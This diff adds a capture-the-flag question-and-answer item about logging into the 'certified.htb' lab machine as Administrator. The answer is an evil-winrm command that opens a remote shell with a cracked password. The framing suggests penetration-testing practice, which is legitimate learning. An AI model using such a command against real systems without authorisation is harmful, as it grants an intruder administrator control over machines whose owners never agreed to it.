@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How do you authenticate as the Administrator after cracking the password?
+
+CONTEXT:
+You have the cracked Administrator password.
+
+METHOD / ANSWER:
+Command: `evil-winrm -i certified.htb -u Administrator -p <cracked_password>`
+Explanation: This command connects to the target via WinRM using the cracked Administrator password.
